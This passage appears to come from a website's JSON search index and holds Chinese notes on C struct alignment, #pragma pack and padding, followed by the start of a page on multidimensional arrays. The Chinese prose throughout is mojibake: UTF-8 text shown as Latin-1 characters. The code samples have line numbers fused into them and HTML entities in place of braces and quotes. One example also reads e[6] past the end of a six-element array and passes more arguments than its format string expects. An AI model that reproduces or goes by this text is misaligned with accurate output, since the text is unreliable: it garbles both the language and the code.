12ä¸ªå­—èŠ‚ã€‚ 1234567struct A&#123; char a; //1+3 int b; //4 char c; //1 //1 + 3??&#125;; è¿™æ˜¯å› ä¸ºè¦æ»¡è¶³è§„åˆ™ä¸‰ã€‚ä¹‹æ‰€ä»¥ç¼–è¯‘å™¨åœ¨åé¢è¡¥å……3ä¸ªå­—èŠ‚ï¼Œæ˜¯ä¸ºäº†å®ç°ç»“æ„æ•°ç»„çš„å­˜å–æ•ˆç‡ã€‚è¯•æƒ³å¦‚æœå®šä¹‰ä¸€ä¸ªç»“æ„Açš„æ•°ç»„ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªç»“æ„èµ·å§‹åœ°å€æ˜¯0æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªç»“æ„å‘¢ï¼ŸæŒ‰ç…§æ•°ç»„çš„å®šä¹‰ï¼Œæ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ éƒ½ç´§æŒ¨ç€ã€‚å¦‚æœæˆ‘ä»¬ä¸æŠŠç»“æ„ä½“å¤§å°è¡¥å……ä¸º4çš„æ•´æ•°å€ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªç»“æ„çš„èµ·å§‹åœ°å€å°†æ˜¯0x00009ï¼Œè¿™æ˜¾ç„¶ä¸èƒ½æ»¡è¶³ç»“æ„ä½“èµ·å§‹åœ°å€çš„å¯¹é½ã€‚å› æ­¤è¦æŠŠç»“æ„ä½“è¡¥å……æˆæœ‰æ•ˆå¯¹é½å¤§å°çš„æ•´æ•°å€ã€‚ å…¶å®å¯¹äºchar/short/int/float/doubleç­‰å·²æœ‰ç±»å‹çš„è‡ªèº«å¯¹é½å€¼ä¹Ÿæ˜¯åŸºäºæ•°ç»„è€ƒè™‘çš„ï¼Œåªæ˜¯å› ä¸ºè¿™äº›ç±»å‹çš„é•¿åº¦å·²çŸ¥ï¼Œæ‰€ä»¥ä»–ä»¬çš„è‡ªèº«å¯¹é½å€¼ä¹Ÿå°±å·²çŸ¥ã€‚ å½“å†…å­˜ç©ºé—´æ¯”è¾ƒå®è´µï¼Œæˆ–æœ‰å…¶ä»–æ¡ä»¶è¦æ±‚æ—¶ï¼Œå¯ä¿®æ”¹ç¼–è¯‘å™¨çš„å¯¹é½å€¼ã€‚ VCä¸‹ï¼Œåœ¨Project-&gt;settingï¼ŒCé€‰é¡¹å¡ï¼ŒCategoryçš„Code Generationï¼Œåœ¨Struct Member Alignmentä¸­ä¿®æ”¹ã€‚ åœ¨ä»£ç ä¸­ä½¿ç”¨#pragma pack(value)æŒ‡å®šå¯¹é½å€¼ã€‚ ä½¿ç”¨ä¼ªæŒ‡ä»¤#pragma pack(value)ï¼šCç¼–è¯‘å™¨å°†æŒ‰ç…§valueä¸ªå­—èŠ‚å¯¹é½ï¼Œvalueéœ€æ˜¯2çš„å¹‚æ¬¡æ–¹ï¼Œå¯è®¾å®šä¸º1ã€2ã€4ã€8ï¼ŒVCç¼–è¯‘å™¨é»˜è®¤æ˜¯8ã€‚ ä½¿ç”¨ä¼ªæŒ‡ä»¤#pragma pack()ï¼š å–æ¶ˆè‡ªå®šä¹‰å­—èŠ‚å¯¹é½æ–¹å¼ã€‚ 12345678#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack() âš ï¸#pragma pack(value)å½±å“çš„æ˜¯ç»“æ„ä½“ä¸­æˆå‘˜çš„å¯¹é½æ–¹å¼ï¼Œè€Œä¸å½±å“ç»“æ„ä½“èµ·å§‹åœ°å€çš„å¯¹é½æ–¹å¼ã€‚ è§„åˆ™å››ï¼šåŠ å…¥æŒ‡å®šå¯¹é½å€¼åçš„å˜åŒ– ç”±äºæ‰‹åŠ¨æŒ‡å®šäº†ç¨‹åºçš„å¯¹é½å€¼ã€‚å½“è®¡ç®—ç»“æ„ä½“ä¸­æˆå‘˜çš„å¯¹é½å€¼æ—¶ï¼Œ#pragma pack(value)çš„å¯¹é½å€¼ä¼šä¸è§„åˆ™ä¸€å†²çªï¼Œæ­¤æ—¶ï¼Œæœ‰ä¸¤ç§é€‰æ‹©ï¼Œè¦ä¹ˆæ˜¯ç¨‹åºæŒ‡å®šçš„å¯¹é½å€¼ï¼Œè¦ä¹ˆæ˜¯å†…ç½®ç±»å‹çš„å¯¹é½å€¼ï¼Œæ­¤æ—¶å–ä¸¤è€…æœ€å°å€¼ï¼Œå³min&#123;æŒ‡å®šå¯¹é½å€¼ï¼Œå†…ç½®ç±»å‹çš„å¯¹é½å€¼&#125;ã€‚ ç”±äºæ‰‹åŠ¨æŒ‡å®šäº†ç¨‹åºçš„å¯¹é½å€¼ã€‚å½“è®¡ç®—æ•´ä¸ªç»“æ„ä½“å¤§å°çš„å¯¹é½å€¼æ—¶ï¼Œ#pragma pack(value)çš„å¯¹é½å€¼ä¼šä¸è§„åˆ™äºŒå†²çªï¼Œæ­¤æ—¶ï¼Œæœ‰ä¸¤ç§é€‰æ‹©ï¼Œè¦ä¹ˆæ˜¯ç¨‹åºæŒ‡å®šçš„å¯¹é½å€¼ï¼Œè¦ä¹ˆæ˜¯ç»“æ„ä½“æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„æ•´æ•°å€ã€‚æ­¤æ—¶å–ä¸¤è€…ä¹‹é—´æœ€å°å€¼ï¼Œå³min&#123;æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„æ•´æ•°å€&#125;ã€‚ å› ä¸ºæ˜¯å–minï¼Œæ‰€ä»¥å¦‚æœ#pragma pack(value)çš„æŒ‡å®šå¯¹é½å€¼æ¯”ç»“æ„ä½“æˆå‘˜å†…ç½®ç±»å‹çš„å¯¹é½å€¼å’Œç»“æ„ä½“æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹éƒ½å¤§çš„è¯ï¼Œå®é™…ä¸Šä¹Ÿå°±æ²¡èµ·ä½œç”¨ã€‚ ä¾‹ 1234567891011121314151617181920212223242526#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(2)struct B&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(8)struct C&#123; char a; int b; char c; &#125;;#pragma pack() ä»£ç è¾“å‡ºå„æˆå‘˜åç§»12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)#pragma pack(1)struct A&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(2)struct B&#123; char a; int b; char c; &#125;;#pragma pack()#pragma pack(8)struct C&#123; char a; int b; char c; &#125;;#pragma pack()int main() &#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c)); printf(&quot;Size of struct B: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct B), OFFSET(struct B, a), OFFSET(struct B, b), OFFSET(struct B, c)); printf(&quot;Size of struct C: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct C), OFFSET(struct C, a), OFFSET(struct C, b), OFFSET(struct C, c)); return 0;&#125;123450 //å¸¸é‡0(st *)0 //è½¬ä¸ºstæŒ‡é’ˆç±»å‹((st *)0)-&gt;field //å–stç»“æ„ä½“ä¸­çš„fieldæˆå‘˜çš„å€¼&amp; (((st *)0)-&gt;field) //å–fieldæˆå‘˜çš„åœ°å€ï¼Œç±»å‹ä¸ºfieldæˆå‘˜çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*å·ï¼›è¿™æ˜¯ä¸€ä¸ªå€¼(size_t) &amp; (((st *)0)-&gt;field) //å°†fieldæˆå‘˜åœ°å€è¿™ä¸ªå€¼è½¬ä¸ºsize_tç±»å‹ç”¨OFFSETå®æ¥è·å–æ¯ä¸ªæˆå‘˜åœ¨ç»“æ„ä½“ä¸­çš„åç§»é‡ã€‚å·¥ä½œåŸç†ï¼šé¦–å…ˆå°†åœ°å€0è½¬æ¢ä¸ºç»“æ„ä½“ç±»å‹çš„æŒ‡é’ˆç„¶åè·å–ç»“æ„ä½“æˆå‘˜çš„åœ°å€ç”±äºè¿™ä¸ªåœ°å€æ˜¯ç›¸å¯¹äºç»“æ„ä½“èµ·å§‹åœ°å€ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€å°±æ˜¯æˆå‘˜çš„åç§»åœ°å€ã€‚ å¯¹é½è§„åˆ™å°ç»“ ä¸Šé¢çš„æ¦‚å¿µåˆ©äºç»™åˆå­¦è€…è¿›è¡Œè®²è§£å’Œç†è§£ï¼Œä½†å¦‚æœä»æ•´ä¸ªç»“æ„ä½“èµ·å§‹åœ°å€ã€æˆå‘˜åœ°å€ã€å°¾éƒ¨æˆå‘˜å¡«å……çš„æ€è€ƒè·¯çº¿æ¥çœ‹ï¼Œä»¥ä¸‹æ€»ç»“çš„å¯¹é½å‡†åˆ™æ›´åˆé€‚ã€‚ ç»“æ„ä½“å˜é‡çš„é¦–åœ°å€èƒ½å¤Ÿè¢«å…¶æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜çš„å¤§å°æ‰€æ•´é™¤ï¼› ç»“æ„ä½“æ¯ä¸ªæˆå‘˜ç›¸å¯¹ç»“æ„ä½“é¦–åœ°å€çš„åç§»é‡(offset)éƒ½æ˜¯min{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼}min\\{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼\\}min{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼}å¤§å°çš„æ•´æ•°å€ã€‚å¦‚æœ‰éœ€è¦ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æˆå‘˜ä¹‹é—´åŠ ä¸Šå¡«å……å­—èŠ‚ï¼ˆinternal paddingï¼‰ï¼› ç»“æ„ä½“çš„æ€»å¤§å°ä¸ºmin{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼}min\\{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼\\}min{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼}å¤§å°çš„æ•´æ•°å€ã€‚å¦‚æœ‰éœ€è¦ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æœ€æœ«ä¸€ä¸ªæˆå‘˜ä¹‹ååŠ ä¸Šå¡«å……å­—èŠ‚ï¼ˆtrailing paddingï¼‰ã€‚ å¯¹ä»¥ä¸Šä¸‰æ¡è§„åˆ™çš„è¯´æ˜å¦‚ä¸‹ï¼š ç¬¬ä¸€æ¡ï¼šç¼–è¯‘å™¨åœ¨ç»™ç»“æ„ä½“å¼€è¾Ÿç©ºé—´æ—¶ï¼Œé¦–å…ˆæ‰¾åˆ°ç»“æ„ä½“ä¸­æœ€å®½çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œç„¶åå¯»æ‰¾å†…å­˜åœ°å€èƒ½è¢«è¯¥åŸºæœ¬æ•°æ®ç±»å‹æ‰€æ•´é™¤çš„ä½ç½®ï¼Œä½œä¸ºç»“æ„ä½“çš„é¦–åœ°å€ã€‚å°†è¿™ä¸ªæœ€å®½çš„åŸºæœ¬æ•°æ®ç±»å‹çš„å¤§å°ä½œä¸ºä¸Šé¢ä»‹ç»çš„å¯¹é½æ¨¡æ•°ã€‚ ç¬¬äºŒæ¡ï¼šä¸ºç»“æ„ä½“çš„ä¸€ä¸ªæˆå‘˜å¼€è¾Ÿç©ºé—´ä¹‹å‰ï¼Œç¼–è¯‘å™¨é¦–å…ˆæ£€æŸ¥é¢„å¼€è¾Ÿç©ºé—´çš„é¦–åœ°å€ç›¸å¯¹äºç»“æ„ä½“é¦–åœ°å€çš„åç§»æ˜¯å¦æ˜¯min{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼}min\\{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼\\}min{æŒ‡å®šå¯¹é½å€¼ï¼Œæˆå‘˜è‡ªèº«å¯¹é½å€¼}å¤§å°çš„æ•´æ•°å€ã€‚è‹¥æ˜¯ï¼Œåˆ™ç›´æ¥å­˜æ”¾æœ¬æˆå‘˜ï¼Œåä¹‹ï¼Œåˆ™åœ¨æœ¬æˆå‘˜å’Œä¸Šä¸€ä¸ªæˆå‘˜ä¹‹é—´å¡«å……ä¸€å®šçš„å­—èŠ‚ï¼Œä»¥è¾¾åˆ°æ•´æ•°å€çš„è¦æ±‚ï¼Œä¹Ÿå°±æ˜¯å°†é¢„å¼€è¾Ÿç©ºé—´çš„é¦–åœ°å€åç§»å‡ ä¸ªå­—èŠ‚ã€‚ ç¬¬ä¸‰æ¡ï¼šç»™æœ€åä¸€ä¸ªæˆå‘˜åˆ†é…å®Œåœ°å€åï¼Œè¿˜éœ€è¦æ£€æŸ¥ç›®å‰æ•´ä¸ªç»“æ„ä½“çš„å¤§å°æ˜¯å¦æ˜¯min{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼}min\\{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼\\}min{æŒ‡å®šå¯¹é½å€¼ï¼Œç»“æ„ä½“ä¸­æœ€å®½åŸºæœ¬ç±»å‹æˆå‘˜å¤§å°çš„å¯¹é½å€¼}å¤§å°çš„æ•´æ•°å€ï¼Œå¦‚æœä¸æ˜¯ï¼Œç¼–è¯‘å™¨ä¼šåœ¨æœ€æœ«ä¸€ä¸ªæˆå‘˜ä¹‹åç»§ç»­å¡«å……å­—èŠ‚ã€‚ è¡¥å……ï¼š ç»“æ„ä½“æˆå‘˜æœ‰æ•°ç»„ï¼Œæ˜¯çœ‹æ•°ç»„çš„åŸºæœ¬ç±»å‹ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ•°ç»„çš„é•¿åº¦ ç»“æ„ä½“Aä¸­æœ‰ç»“æ„ä½“Bæˆå‘˜ï¼Œåˆ™ç»“æ„ä½“Bçš„å¯¹é½å€¼ä¸ºç»“æ„ä½“Bä¸­æœ€å®½çš„æˆå‘˜çš„å¯¹é½å€¼ ç©ºç»“æ„ä½“å’Œç©ºç±»çš„å¤§å°ä¸º1 ä¾‹é¢˜ æ ¹æ®ä¸Šé¢å°ç»“çš„ä¸‰æ¡å¯¹é½è§„åˆ™å®Œæˆä¸‹é¢çš„ä¾‹é¢˜ã€‚ è¿™é‡Œæˆ‘å‡ºçš„é¢˜ï¼Œç›´æ¥å°±æŒ‰è‡ªç„¶å¯¹é½æ¥å‡ºé¢˜ï¼›å¦‚æœæœ‰æŒ‡å®šå¯¹é½å€¼ï¼Œä¸€æ ·çš„ï¼Œç¬¬äºŒæ¡ã€ç¬¬ä¸‰æ¡å°±å–minã€‚ ä¾‹1 123456struct A&#123; char a; int b; char c;&#125;; ç­”æ¡ˆç­”æ¡ˆï¼š123456struct A&#123; char a; //1 + 3 int b; //4 char c; //1 + 3&#125;; //æ€»å¤§å°121234567891011121314151617#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)struct A&#123; char a; int b; char c;&#125;;int main() &#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c)); return 0;&#125;åˆ†æè¿‡ç¨‹ï¼šç»“æ„ä½“ä¸­æˆå‘˜çš„æœ€å®½æ•°æ®ç±»å‹æ˜¯intç±»å‹ï¼Œ4å­—èŠ‚ã€‚ç¬¬ä¸€æ¡ï¼šç»“æ„ä½“èµ·å§‹åœ°å€èƒ½è¢«4æ•´é™¤ã€‚ç¬¬äºŒæ¡ï¼šç¬¬1ä¸ªæˆå‘˜aï¼Œåˆ†é…1å­—èŠ‚ã€‚ç¬¬2ä¸ªæˆå‘˜bï¼Œç›¸å¯¹ç»“æ„ä½“èµ·å§‹åœ°å€åç§»æ˜¯1ï¼Œä¸èƒ½è¢«4æ•´é™¤ï¼Œè¦åœ¨æˆå‘˜aåé¢å¡«å……3ä¸ªå­—èŠ‚ã€‚ç¬¬3ä¸ªæˆå‘˜cï¼Œç›¸å¯¹ç»“æ„ä½“èµ·å§‹åœ°å€åç§»æ˜¯8ï¼Œèƒ½è¢«1æ•´é™¤ï¼Œä¸å¡«å……ã€‚ç¬¬ä¸‰æ¡ï¼šç›®å‰æ•´ä¸ªç»“æ„ä½“å¤§å°æ˜¯4+4+1=9ï¼Œä¸èƒ½æ•´é™¤4ï¼Œè¦åœ¨å°¾éƒ¨å¡«å……3å­—èŠ‚ã€‚å®é™…åˆ†æçš„è¯ï¼Œç›´æ¥å†™å°±è¡Œäº†ã€‚ä¸ç”¨ç”»å›¾ï¼Œè¿™é‡Œç”»å›¾åªæ˜¯ä¸ºäº†ç›´è§‚å±•ç¤ºã€‚ ä¾‹2 12345678struct A&#123; char a; short b; char c; int d; char e[6];&#125;; ç­”æ¡ˆæ•°ç»„è¿˜æ˜¯çœ‹charç±»å‹ï¼Œè€Œä¸æ˜¯æ•°ç»„æ€»é•¿åº¦ç­”æ¡ˆï¼š12345678struct A&#123; char a; //1 + 1 short b; //2 char c; //1 + 3 int d; //4 char e[6]; //6 + 2&#125;; //æ€»å¤§å°ï¼š201234567891011121314151617181920212223#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t) &amp; (((st *)0)-&gt;field)struct A&#123; char a; //1 + 1 short b; //2 char c; //1 + 3 int d; //4 char e[6]; //6 + 2&#125;; //æ€»å¤§å°ï¼š20int main()&#123; printf(&quot;Size of struct A: %lu a-%lu, b-%lu, c-%lu, d-%lu e[0]-%lu, e[1]-%lu, e[2]-%lu e[3]-%lu, e[4]-%lu, e[5]-%lu &quot;, sizeof(struct A), OFFSET(struct A, a), OFFSET(struct A, b), OFFSET(struct A, c), OFFSET(struct A, d), OFFSET(struct A, e[0]), OFFSET(struct A, e[1]), OFFSET(struct A, e[2]), OFFSET(struct A, e[3]), OFFSET(struct A, e[4]), OFFSET(struct A, e[5]), OFFSET(struct A, e[6])); return 0;&#125; ä¾‹3 12345678910111213struct B&#123; char a; int b; double c;&#125;;struct A&#123; short c; struct B d; int e;&#125;; ç­”æ¡ˆ12345678910111213struct B&#123; char a; //1 + 3 int b; //4 double c; //8&#125;; //æ€»å¤§å°ï¼š16struct A&#123; short c; //2 + 6 struct B d; //16 int e; //4 + 4&#125;; //æ€»å¤§å°ï¼š32ç»“æ„ä½“Bæˆå‘˜å’Œæ€»å¤§å°çš„åˆ†æç•¥ã€‚ä¸‹é¢åˆ†æç»“æ„ä½“Aï¼šæˆå‘˜cï¼Œå 2ä¸ªå­—èŠ‚ã€‚æˆå‘˜dï¼Œè¦å 16ä¸ªå­—èŠ‚ã€‚å¯¹é½å€¼æ˜¯ç»“æ„ä½“Bä¸­æœ€å®½çš„æˆå‘˜çš„å®½åº¦ï¼Œæ˜¯doubleç±»å‹ï¼Œå¯¹é½å€¼æ˜¯8ã€‚æ‰€ä»¥è¦åœ¨æˆå‘˜cåé¢è¡¥6ä¸ªå­—èŠ‚æˆå‘˜eï¼Œç›®å‰åç§»æ•´ä¸ªç»“æ„ä½“èµ·å§‹åœ°å€2+6+16=24ï¼Œèƒ½è¢«4æ•´é™¤ï¼Œä¸å¡«å……ï¼Œæ”¾æˆå‘˜eã€‚å°¾éƒ¨å¡«å……ï¼šæ•´ä¸ªç»“æ„ä½“å¤§å°éœ€è¦æ˜¯æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„å€æ•°ï¼Œæœ€å®½çš„æ˜¯dï¼Œä¸º8ã€‚ç›®å‰æ˜¯2+6+16+4=28ï¼Œä¸èƒ½è¢«8æ•´é™¤ï¼Œéœ€è¦å¡«å……4å­—èŠ‚ã€‚ä¸ºä»€ä¹ˆä¸æ˜¯16ï¼Ÿä¸èƒ½æŠŠstructçœ‹æˆä¸€ä¸ªæ•´ä½“ï¼Œè¦è¿™æ ·çœ‹ï¼š1234567891011struct A&#123; short c; //2+6 struct B //å¯¹é½äº8 &#123; char a; //1 + 3 int b; //4 double c; //8 &#125;d; //æ€»å¤§å°ï¼š16 int e; //4 + 8 or 16??? &#125;;è€Œä¸”è¿™æ ·å±•å¼€åï¼Œä¹Ÿå°±æ˜ç™½äº†ï¼Œæˆå‘˜dçš„å¯¹é½å€¼ä¸ºä»€ä¹ˆè¦æ˜¯æˆå‘˜ä¸­æœ€å®½çš„æ•°æ®ç±»å‹çš„å€æ•°ã€‚å› ä¸ºå¯¹é½äºæœ€å®½ï¼Œå…¶ä»–æˆå‘˜è‚¯å®šå°±å¯¹é½äº†ã€‚æ‰€ä»¥æ€»å¤§å°ä¸º32å­—èŠ‚ã€‚12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#define OFFSET(st, field) (size_t)&amp;(((st*)0)-&gt;field)struct B&#123; char a; int b; double c;&#125;;struct A&#123; short c; struct B d; int e;&#125;;int main() &#123; printf(&quot;Size of struct B: %lu a-%lu, b-%lu, c-%lu &quot;, sizeof(struct B), OFFSET(struct B, a), OFFSET(struct B, b), OFFSET(struct B, c)); printf(&quot;Size of struct A: %lu c-%lu, d.a-%lu, d.b-%lu, d.c-%lu, e-%lu &quot;, sizeof(struct A), OFFSET(struct A, c), OFFSET(struct A, d.a), OFFSET(struct A, d.b), OFFSET(struct A, d.c), OFFSET(struct A, e)); return 0;&#125; å‚è€ƒ é“¾æ¥ å¤‡æ³¨ Cè¯­è¨€å­—èŠ‚å¯¹é½é—®é¢˜è¯¦è§£ å†™å¾—å¾ˆè¯¦ç»† å­—èŠ‚å¯¹é½ä¸å¡«å……ï¼ˆData Alignment and Padding In Cï¼‰ å†™å¾—å¤ªå‘æ•£äº† Lecture 5: Structures and Alignment University of Washingtonçš„è¯¾ï¼Œå†™å¾—ä¹Ÿå¾ˆå¥½"},{"title":"å¤šç»´æ•°ç»„","path":"/wiki/C/å¤šç»´æ•°ç»„.html","content":"å®šä¹‰ äºŒç»´æ•°ç»„ æ ¹æ®æˆ‘ä»¬å‰é¢å­¦çš„ä¸€ç»´æ•°ç»„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ç”¨æ•°ç»„è¡¨ç¤ºè¿™ä¸ªé—®é¢˜ï¼šä¸€ä¸ªç­æœ‰5ä¸ªç»„ï¼Œæ¯ä¸ªç»„æœ‰9ä¸ªäººï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å®šä¹‰æ•°ç»„ï¼š 123int arr[45];//æˆ–int arr[5*9]; //æ•´æ•°å¸¸é‡è¡¨è¾¾å¼ ä¹Ÿå¯ä»¥ç”¨è¿™ç§å½¢å¼ï¼Œä¹Ÿç§°äºŒç»´æ•°ç»„ 1int arr[5][9]; å¤šç»´æ•°ç»„ æ¯”å¦‚ä¸€ä¸ªå¿æœ‰5ä¸ªå­¦æ ¡ï¼Œæ¯ä¸ªå­¦æ ¡æœ‰3ä¸ªå¹´çº§ï¼Œæ¯ä¸ªå¹´çº§æœ‰4ä¸ªç­ï¼Œæ¯ä¸ªç­æœ‰5ä¸ªç»„ï¼Œæ¯ä¸ªç»„æœ‰9ä¸ªäººã€‚ 123int arr[5*3*4*5*9];//æˆ–int arr[5][3][4][5][9]; åˆå§‹åŒ–å¤šç»´æ•°ç»„ 123456int arr[3][4]=&#123; &#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,7,6,5&#125;,&#125;; åˆå§‹åŒ–çš„æ•°å€¼å¦‚æœä¸å¤Ÿï¼Œåé¢æ²¡æœ‰å€¼åˆå§‹åŒ–çš„å…ƒç´ è¢«ç»Ÿä¸€åˆå§‹åŒ–ä¸º0 12345int arr[3][4] = &#123; &#123;1,2&#125;,\t&#123;5&#125;,\t&#123;9&#125;&#125; ä¸å…è®¸è¶…è¿‡ç»´åº¦çš„æœ€å¤§é•¿åº¦ï¼Œä»¥ä¸‹ä»£ç ç¼–è¯‘ä¼šæŠ¥é”™ 123456789101112#include &quot;stdafx.h&quot;int main(int argc, char *argv[])&#123; int arr[3][4] = &#123; &#123;1, 2, 3, 4, 5&#125;, &#123;5&#125;, &#123;9&#125; &#125;; return 0;&#125; å¯ä»¥çœç•¥é‡Œé¢çš„&#123;&#125;ï¼Œ&#123;&#125;åªæ˜¯è®©ç¨‹åºå‘˜å¼€èµ·æ¥æ›´ç›´è§‚ï¼Œå¯¹ç¼–è¯‘å™¨è€Œè¨€éƒ½æ˜¯ä¸€ç»´æ•°ç»„ã€‚ 123int arr[3][4] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12&#125;; //ç¼–è¯‘é€šè¿‡int arr[3][4] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; //å…¶ä½™è¡¥0 å¯ä»¥çœç•¥ç¬¬ä¸€ç»´çš„å€¼ 12345int arr[][4] = &#123;1,2,3,4,5,6,7,8,9,10,11,12&#125;;\t//æŒ‰4ä¸ªä¸€ç»„ï¼Œæ‰€ä»¥ç¬¬ä¸€ç»´ç¼–è¯‘å™¨èƒ½ç¡®å®šæ˜¯3 int arr[3][] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; //ç¼–è¯‘å™¨æ— æ³•ç¡®å®šå‡ ä¸ªä¸€ç»„ï¼Œç¼–è¯‘ä¸é€šè¿‡ int arr[3][4] = &#123;1,2,3,4,5,6,7,8,9,10&#125;; //æŒ‰4ä¸ªä¸€ç»„ï¼Œå…¶ä½™è¡¥0ï¼Œç»´ç¼–è¯‘å™¨èƒ½ç¡®å®šæ˜¯3 å†…å­˜å­˜å‚¨ å¤šç»´æ•°ç»„çš„å†…å­˜å­˜å‚¨å’Œä¸€ç»´æ•°ç»„ä¸€æ ·ï¼Œéƒ½æ˜¯è¿ç»­å­˜å‚¨ã€‚ ä¸€ç»´æ•°ç»„æ–¹å¼çš„åæ±‡ç¼–äºŒç»´æ•°ç»„æ–¹å¼çš„åæ±‡ç¼–12345678#include &quot;stdafx.h&quot;int main()&#123;\tint arr[3 * 4] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 7, 6, 5&#125;;\treturn 0;&#125; 12345678910111213#include &quot;stdafx.h&quot;int main()&#123; int arr[3][4]= &#123; &#123;1,2,3,4&#125;, &#123;5,6,7,8&#125;, &#123;9,7,6,5&#125;, &#125;;\treturn 0;&#125; åªæ˜¯å¤šç»´æ•°ç»„çš„å†™æ³•ï¼Œè®©ç¨‹åºå‘˜å¯ä»¥æ›´æ–¹ä¾¿çš„æ‰¾åˆ°æƒ³ä½¿ç”¨çš„æ•°æ®ã€‚ æ¯”å¦‚:ä¸€å¹´æœ‰12ä¸ªæœˆï¼Œæ¯ä¸ªæœˆéƒ½æœ‰ä¸€ä¸ªå¹³å‡æ°”æ¸©ï¼Œå­˜å‚¨5å¹´çš„æ•°æ®ã€‚ ç¨‹åºå‘˜æƒ³ä½¿ç”¨ç¬¬ä¸€å¹´ç¬¬9ä¸ªæœˆçš„æ•°æ®å°±ä½¿ç”¨arr[0][8]ï¼›æƒ³ä½¿ç”¨ç¬¬äºŒå¹´ç¬¬8ä¸ªæœˆçš„æ•°æ®å°±ä½¿ç”¨arr[1][7]ã€‚ ä½†åœ¨å†…å­˜ä¸­å¤šç»´æ•°ç»„æ˜¯è¿ç»­å­˜å‚¨çš„ï¼Œç¼–è¯‘å™¨æ˜¯æ€ä¹ˆæ‰¾åˆ°çš„ï¼Ÿå¯¹äºarr[0][8]ï¼Œç¼–è¯‘å™¨æ˜¯è¿™æ ·æ‰¾åˆ°çš„arr[0*12+8]ï¼›å¯¹äºarr[1][7]ï¼Œç¼–è¯‘å™¨æ˜¯è¿™æ ·æ‰¾åˆ°çš„arr[1*12+7]ï¼Œè·³è¿‡ç¬¬ä¸€å¹´ï¼Œç¬¬ä¸€å¹´æœ‰12ä¸ªï¼Œæ‰€ä»¥æ˜¯1*12ã€‚ 1234567int arr[5][12] = &#123; &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 0 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 1 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 2 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 3 &#123;1, 2, 1, 4, 5, 6, 7, 8, 9, 1, 2, 3&#125;, // 4&#125;; åŒç†ï¼Œå‡è®¾ä¸€å…±æœ‰5ä¸ªç­ï¼Œæ¯ä¸ªç­4ä¸ªç»„ï¼Œæ¯ç»„3ä¸ªäºº 1234567int arr[5][4][3] = &#123; &#123;&#123;1, 2, 3&#125;, &#123;4, 5, 6&#125;, &#123;7, 8, 9&#125;, &#123;11, 12, 13&#125;&#125;, // 0 &#123;&#123;11, 12, 13&#125;, &#123;14, 15, 16&#125;, &#123;17, 18, 19&#125;, &#123;111, 112, 113&#125;&#125;, // 1 